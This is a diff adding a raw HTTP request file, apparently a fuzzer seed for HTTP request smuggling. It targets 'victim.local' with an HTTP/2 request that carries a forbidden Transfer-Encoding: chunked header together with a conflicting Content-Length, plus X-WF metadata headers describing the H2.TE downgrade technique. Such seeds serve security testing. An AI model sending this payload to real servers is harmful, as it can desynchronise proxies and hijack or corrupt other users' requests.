@@ -1,0 +1,19 @@
+POST /queue/append HTTP/1.1
+Host: victim.local
+X-WF-Request-ID: seedh2te01
+X-WF-Family: h2_te
+X-WF-Tags: H2.TE,downgrade,transfer_encoding
+X-WF-Transport: h2_raw
+X-WF-Delivery: h2_raw
+X-WF-Probe: none
+X-WF-Pause-MS: 0
+X-WF-Chunk-Shape: none
+X-WF-H2-Mode: forbidden_transfer_encoding
+X-WF-H2-End-Stream: normal
+X-WF-Impact: /queue/append
+Transfer-Encoding: chunked
+Content-Length: 14
+
+1
+Z
+0
